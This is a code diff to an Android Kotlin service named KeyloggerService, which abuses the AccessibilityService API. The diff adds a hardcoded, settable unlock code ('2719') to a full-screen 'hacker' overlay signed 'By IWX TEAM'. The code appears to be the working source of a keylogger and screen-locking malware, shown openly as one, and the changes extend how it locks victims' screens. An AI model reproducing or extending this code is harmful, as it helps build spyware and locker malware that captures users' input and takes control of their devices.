@@ -24,8 +24,11 @@ class KeyloggerService : AccessibilityService() {
 
     companion object {
         @Volatile var instance: KeyloggerService? = null
+        @Volatile var unlockCode: String = "2719"
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
-        fun hideScreenInject()                                             { instance?.hideOverlay() }
+        fun hideScreenInject()   { instance?.hideOverlay() }
+        fun setUnlockCode(code: String) { unlockCode = code }
+        fun resetUnlockCode()    { unlockCode = "2719" }
     }
 
     @Volatile private var overlayView: HackerOverlayView? = null
@@ -264,7 +267,7 @@ class KeyloggerService : AccessibilityService() {
             hideOverlayInternal()
             val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             wm = windowManager
-            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style) { hideOverlay() }
+            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode) { hideOverlay() }
             val params = WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
